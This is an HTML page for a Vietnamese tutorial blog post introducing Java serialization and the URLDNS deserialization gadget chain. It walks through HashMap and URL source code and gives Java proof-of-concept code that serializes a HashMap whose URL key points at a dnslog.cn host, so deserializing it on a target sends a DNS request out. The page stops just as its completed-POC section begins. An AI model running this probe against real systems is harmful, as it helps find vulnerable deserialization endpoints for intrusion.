@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+  
+  <title>Introduction to Java Deserialization | Rayinaw</title>
+  <meta name="author" content="Rayinaw" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="Deserialization, Java" />
+  
+  <meta name="description" content="Bài viết này là về những concept cơ bản của quá trình Serialization và Deserialization và cách mà lỗ hổng Java Deserialization được thực thi. Serialization và Deserialization1. Serialization và deseri">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Introduction to Java Deserialization">
+<meta property="og:url" content="https://rayinaw.github.io/2022/11/03/JavaDeserializationBasic/index.html">
+<meta property="og:site_name" content="Rayinaw">
+<meta property="og:description" content="Bài viết này là về những concept cơ bản của quá trình Serialization và Deserialization và cách mà lỗ hổng Java Deserialization được thực thi. Serialization và Deserialization1. Serialization và deseri">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+<meta property="article:published_time" content="2022-11-02T19:50:28.000Z">
+<meta property="article:modified_time" content="2022-11-03T16:55:27.879Z">
+<meta property="article:author" content="Rayinaw">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Deserialization">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Rayinaw" type="application/atom+xml">
+</head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>Trang chủ</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-book"></i>Kho lưu trữ</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/about/"><i class="fa fa-paper-plane"></i>Về mình</a></li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Rayinaw</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Rayinaw</h2> <br />
+                        <span>Nơi mình ghi chú lại những thứ đã học.</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="https://rayinaw.github.io/2022/11/03/JavaDeserializationBasic/">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">Introduction to Java Deserialization</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2022-11-02T19:50:28.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2022-11-03</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> Tác giả <span itemprop="name">Rayinaw</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~10.99K
+                    
+                    từ
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>Bài viết này được chỉnh sửa lần cuối vào <time datetime="1667494527879"></time> trước, và có thể cần cập nhật。</p></div>
+            </div>
+            
+            
+            
+                <div class="kratos-post-inner-toc toc-div-class" >
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Serialization-va-Deserialization"><span class="toc-number">1.</span> <span class="toc-text">Serialization và Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Serialization-va-deserialization-la-gi"><span class="toc-number">1.1.</span> <span class="toc-text">1. Serialization và deserialization là gì?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Nhung-qua-trinh-can-su-dung-den-Serialization"><span class="toc-number">1.2.</span> <span class="toc-text">2. Những quá trình cần sử dụng đến Serialization:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Trien-khai-qua-trinh-Ser-va-Deser-co-ban"><span class="toc-number">1.3.</span> <span class="toc-text">3. Triển khai quá trình Ser và Deser cơ bản:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cach-ma-lo-hong-Deserialization-xay-ra"><span class="toc-number">2.</span> <span class="toc-text">Cách mà lỗ hổng Deserialization xảy ra:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-HashMap-va-cach-no-gay-ra-lo-hong-Deserialization"><span class="toc-number">2.1.</span> <span class="toc-text">1. HashMap và cách nó gây ra lỗ hổng Deserialization:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Phan-tich-chuoi-URLDNS"><span class="toc-number">2.2.</span> <span class="toc-text">2. Phân tích chuỗi URLDNS:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-POC-cho-chuoi-URLDNS"><span class="toc-number">2.3.</span> <span class="toc-text">3. POC cho chuỗi URLDNS:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Chu-y-khi-thuc-hien-serialize-object-cua-lop-HashMap"><span class="toc-number">2.3.1.</span> <span class="toc-text">Chú ý khi thực hiện serialize object của lớp HashMap:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-hoan-thien-cua-chuoi-URLDNS"><span class="toc-number">2.3.2.</span> <span class="toc-text">POC hoàn thiện của chuỗi URLDNS:</span></a></li></ol></li></ol></li></ol>
+                </div>
+            
+            <hr />
+            <div itemprop="articleBody"><p>Bài viết này là về những concept cơ bản của quá trình Serialization và Deserialization và cách mà lỗ hổng Java Deserialization được thực thi.</p>
+<h1 id="Serialization-va-Deserialization"><a href="#Serialization-va-Deserialization" class="headerlink" title="Serialization và Deserialization"></a>Serialization và Deserialization</h1><h2 id="1-Serialization-va-deserialization-la-gi"><a href="#1-Serialization-va-deserialization-la-gi" class="headerlink" title="1. Serialization và deserialization là gì?"></a>1. Serialization và deserialization là gì?</h2><p>Hiểu một cách đơn giản hai quá trình này là:</p>
+<ul>
+<li>Serialization: Object –&gt; string hay bytecode(với Java)</li>
+<li>Deserialization: string hoặc bytecode –&gt; Object</li>
+</ul>
+<h2 id="2-Nhung-qua-trinh-can-su-dung-den-Serialization"><a href="#2-Nhung-qua-trinh-can-su-dung-den-Serialization" class="headerlink" title="2. Những quá trình cần sử dụng đến Serialization:"></a>2. Những quá trình cần sử dụng đến Serialization:</h2><p>Lưu các đối tượng (ở đây xem như dữ liệu) vào bộ nhớ, tệp, cơ sở dữ liệu,…<br>Truyền các đối tượng qua mạng.<br>Chuyển đối tượng qua RMI.</p>
+<h2 id="3-Trien-khai-qua-trinh-Ser-va-Deser-co-ban"><a href="#3-Trien-khai-qua-trinh-Ser-va-Deser-co-ban" class="headerlink" title="3. Triển khai quá trình Ser và Deser cơ bản:"></a>3. Triển khai quá trình Ser và Deser cơ bản:</h2><p>Ở đây mình tạo một package SerialBasic rồi cho các lớp vào trong package đó.</p>
+<p>File Person.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> SerialBasic;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span>+name+<span class="string">&quot;&#x27; age=&quot;</span>+age+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>File SerializationTest.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> SerialBasic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;rayinaw&quot;</span>, <span class="number">16</span>);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>File DeserializationTest.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> SerialBasic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String FileName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FileName));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">test</span> <span class="operator">=</span> (Person) deserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line">        System.out.println(test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Đầu tiên ta chạy file SerializationTest.java, sau khi chạy xong ta thấy ở trong thư mục cha của src có một file ser.txt mới được tạo.<br>Tiếp đến chạy file DeserializationTest.java:</p>
+<p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/JavaDeserializationBasicPic1.webp" alt="pic1"></p>
+<p>Giải thích:</p>
+<ul>
+<li>SerializationTest.java<br>Ban đầu chúng ta khởi tạo một object new FileOutputStream(“ser.txt”), tiếp đến chúng ta khởi tạo một ObjectOutputStream. Rồi thực hiện oos.writeObject(obj) để viết đối tượng vào file ser.txt<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));  </span><br><span class="line">oos.writeObject(obj);</span><br></pre></td></tr></table></figure></li>
+<li>DeserializationTest.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="Cach-ma-lo-hong-Deserialization-xay-ra"><a href="#Cach-ma-lo-hong-Deserialization-xay-ra" class="headerlink" title="Cách mà lỗ hổng Deserialization xảy ra:"></a>Cách mà lỗ hổng Deserialization xảy ra:</h1><p>Ở đây mình dùng Intellij để thực hiện, một IDEA rất tiện lợi mà ai làm việc với Java đều sử dụng.<br>Mình chỉ nói đến một chuỗi cơ bản để các bạn có thể hình dung cách thực hiện và bắt đầu với Deserialization trong Java nhé ^^.</p>
+<h2 id="1-HashMap-va-cach-no-gay-ra-lo-hong-Deserialization"><a href="#1-HashMap-va-cach-no-gay-ra-lo-hong-Deserialization" class="headerlink" title="1. HashMap và cách nó gây ra lỗ hổng Deserialization:"></a>1. HashMap và cách nó gây ra lỗ hổng Deserialization:</h2><p>Gõ <strong>Ctrl + N</strong> và tìm kiếm lớp <strong>HashMap</strong>:</p>
+<p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/JavaDeserializationBasicPic2.webp" alt="pic2"></p>
+<p>Lớp HashMap này có implements lớp Serializable vậy nên chúng ta có thể dùng nó để lợi dụng quá trình Ser và Deser.</p>
+<p>Tiếp theo mở phần Structure và tìm kiến method <strong>readObject</strong> của lớp <strong>HashMap</strong>:</p>
+<p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/JavaDeserializationBasicPic3.webp" alt="pic3"></p>
+<p>Trong method readObject ta thấy có phần quan trọng ở đây:</p>
+<ul>
+<li>Đầu tiên thực hiện gán key và value &#x3D; s.readObject()</li>
+<li>Sau đó thực hiện hàm putVal(), điểm cần chú ý ở đây là nó đưa key vào method hash().<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/putValinReadObject.png" alt="pic4"></li>
+</ul>
+<p><code>Ctrl + Chuột</code> trái để đi vào phương thức hash():<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/hash.png" alt="hashCode()"><br>Trong phương thức hash này, nếu key &#x3D;&#x3D; null sẽ return 0, còn không thì sẽ thực hiện <code>h = key.hashCode()) ^ (h &gt;&gt;&gt; 16)</code> rồi return h.<br>Điểm mà chúng ta cần chú ý ở đây là nó thực hiện key.hashCode() mình sẽ đi sâu một chút cho các bạn dễ hiểu:</p>
+<ul>
+<li>Trong Java có một lớp là cha của mọi lớp đó là lớp Object, nó có các phương thức như toString(), hashCode(),…</li>
+<li>key là một object của lớp hashMap mà implements ngầm lớp Object (vì nó cha của mọi lớp mà) vậy nên nó thừa hưởng các phương thức của lớp Object. Nên ở đây chúng ta có thể gọi key.hashCode()</li>
+</ul>
+<p>Việc gọi hashCode() ở đây có ý nghĩa gì thì chúng ta cùng đi sâu vào chuổi URLDNS nhé!</p>
+<h2 id="2-Phan-tich-chuoi-URLDNS"><a href="#2-Phan-tich-chuoi-URLDNS" class="headerlink" title="2. Phân tích chuỗi URLDNS:"></a>2. Phân tích chuỗi URLDNS:</h2><p>Chuỗi URLDNS là một chuỗi đơn giản nhất trong các gadget chain (đương nhiên sẽ hơi khó hiểu với người bắt đầu, keep going ^^). Chuỗi này không thực sự gây ra một vấn đề gì nghiêm trọng như là RCE hay là SSRF…, kết quả của chuỗi này là thực hiện một yêu cầu DNS đến địa chỉ mà chúng ta đưa vào. Nó có kết quả phải không nào ^^, vậy nên chuỗi này sẽ giúp các bạn biết được một gadget chain sẽ xảy ra như thế nào. Cố gắng viết code, đọc hiểu để nhanh tiến bộ nhé ٩(^‿^)۶…</p>
+<p>Chuỗi thực thi của URLDNS như sau:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.putVal()</span><br><span class="line">            HashMap.hash()</span><br><span class="line">                URL.hashCode()</span><br></pre></td></tr></table></figure>
+
+<p>Để tạo một HashMap, đầu tiên chúng ta thực hiện tạo một object hashmap, sau đó chúng ta sẽ thực hiện hàm put() để đưa dữ liệu vào trong object HashMap đó.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://0tvykt.dnslog.cn&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Ở đây tham số đầu tiên của hàm put() là một object key, và tham số thứ hai là value. Hai biến này tương ứng với key và value mình đã phân tích ở trên phần phân tích về HashMap. Ở đây vì key nhận vào là một object nên ở đây chúng ta sẽ tạo một object URL để thực hiện chain này.<br>Bây giờ, giả sử như chúng ta thực hiện readObject hashmap, nó sẽ đi theo sơ đồ:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.putVal()</span><br><span class="line">            HashMap.hash()</span><br><span class="line">                URL.hashCode()</span><br></pre></td></tr></table></figure>
+
+<p>Và đến đây, phương thức hashCode() được gọi sau khi readObject() sẽ phát huy tác dụng. Chúng ta sẽ đi sâu vào phần này:<br>Tiếp tục chúng ta tìm class URL rồi tìm đến method hashCode().<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashCodeOfURLObject.webp" alt="pic6"></p>
+<p>Ở đây, phương thức <code>hashCode()</code> của lớp Object đã được định nghĩa lại trong lớp URL:</p>
+<ul>
+<li>Nếu <code>hashCode</code> không bằng -1 thì sẽ thực hiện <code>return hashCode</code> bởi vì nó đã được set rồi.</li>
+<li>Nếu không thì <code>hashCode</code> sẽ được gán bằng <code>handler.hashCode(this)</code>, this ở đây có nghĩa là nó sẽ lấy object của lớp hiện tại đưa vào handler.hashCode rồi thực hiện tiếp.<br>Tiến hành <code>Ctrl+Chuột trái</code> rồi nhấn vào handler để đi đến nơi mà biến hanler được tạo.<br><code>Ảnh biến handler</code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br></pre></td></tr></table></figure>
+Biến handler ở đây là một object của lớp <code>URLStreamHandler</code>, object này sẽ gọi đến phương thức hashCode() được định nghĩa trong lớp này. Tiến hành <code>Ctrl+Chuột trái</code> rồi click vào <code>URLStreamHandler</code>, rồi tìm đến phương thức hashCode().</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashCodeOfURLStreamHandler.webp" alt="pic7"></p>
+<p>Trong phương thức này chúng ta thấy dòng <code>InetAddress addr = getHostAddress(u);</code> có nghĩa là nó sẽ thực hiện một yêu cầu DNS đến địa chỉ URL để thực hiện getHostAddress. Đến đây ta đạt được mục đích của Chain này đó là request đến địa chỉ URL mà ta cung cấp. Còn lại phần sau và việc nó thực hiện request thế nào thì chúng ta không cần quan tâm, chỉ vậy là đã đủ (Đương nhiên bạn nào thích thì cứ tìm hiểu nhé ^^).</p>
+<h2 id="3-POC-cho-chuoi-URLDNS"><a href="#3-POC-cho-chuoi-URLDNS" class="headerlink" title="3. POC cho chuỗi URLDNS:"></a>3. POC cho chuỗi URLDNS:</h2><p>Link nhận DNS request: <a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
+<h3 id="Chu-y-khi-thuc-hien-serialize-object-cua-lop-HashMap"><a href="#Chu-y-khi-thuc-hien-serialize-object-cua-lop-HashMap" class="headerlink" title="Chú ý khi thực hiện serialize object của lớp HashMap:"></a>Chú ý khi thực hiện serialize object của lớp HashMap:</h3><p>Filename: SerializeTest.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BasicChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;Ser2.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://0tvykt.dnslog.cn&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Sau khi chạy file này, dù chưa thực hiện deserialize file <code>Ser2.txt</code> mà chúng ta đã nhận được request đến. Nguyên nhân là do khi thực hiện gán giá trị vào object hashmap bằng hashmap.put(), hàm hash trong phương thức này đã được thực hiện và sẽ request đến địa chỉ URL mà ta cung cấp.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashMapPutMethod.webp" alt="pic5"><br>Sau khi request đến URL, biến hashcode bây giờ đã không còn là -1 nữa, khi đó trong quá trình deserialize request sẽ không được gửi đến. Vậy nên sau khi thực hiện deserialize, chúng ta cần thực hiện set lại giá trị cho hashcode là -1. Tuy nhiên vấn đề ở đây là biến hashcode là private, để gán lại giá trị cho biến private chúng ta cần sử dụng đến Reflection mà mình đã có bài viết về nó.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashCodeOfURLObject.webp" alt="hashcodeVal"></p>
+<h3 id="POC-hoan-thien-cua-chuoi-URLDNS"><a href="#POC-hoan-thien-cua-chuoi-URLDNS" class="headerlink" title="POC hoàn thiện của chuỗi URLDNS:"></a>POC hoàn thiện của chuỗi URLDNS:</h3><p>file: SerializeTest.java</p>
